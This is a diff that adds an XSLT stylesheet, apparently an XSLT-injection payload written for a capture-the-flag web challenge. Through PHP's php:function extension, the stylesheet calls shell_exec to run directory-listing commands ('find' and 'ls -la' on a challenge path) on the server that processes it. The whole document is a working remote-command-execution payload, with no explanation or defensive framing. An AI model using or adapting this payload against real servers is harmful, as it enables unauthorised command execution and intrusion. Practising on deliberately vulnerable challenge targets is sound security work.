@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<xsl:template match="/">
+  <html>
+  <body>
+    <h2>Exploration du répertoire :</h2>
+    <pre>
+      <xsl:value-of select="php:function('shell_exec', 'find . -maxdepth 2 -not -path \'*/.*\'')"/>
+      
+      <xsl:value-of select="php:function('shell_exec', 'ls -la /challenge/web-serveur/ch50/')"/>
+    </pre>
+  </body>
+  </html>
+</xsl:template>
+</xsl:stylesheet>
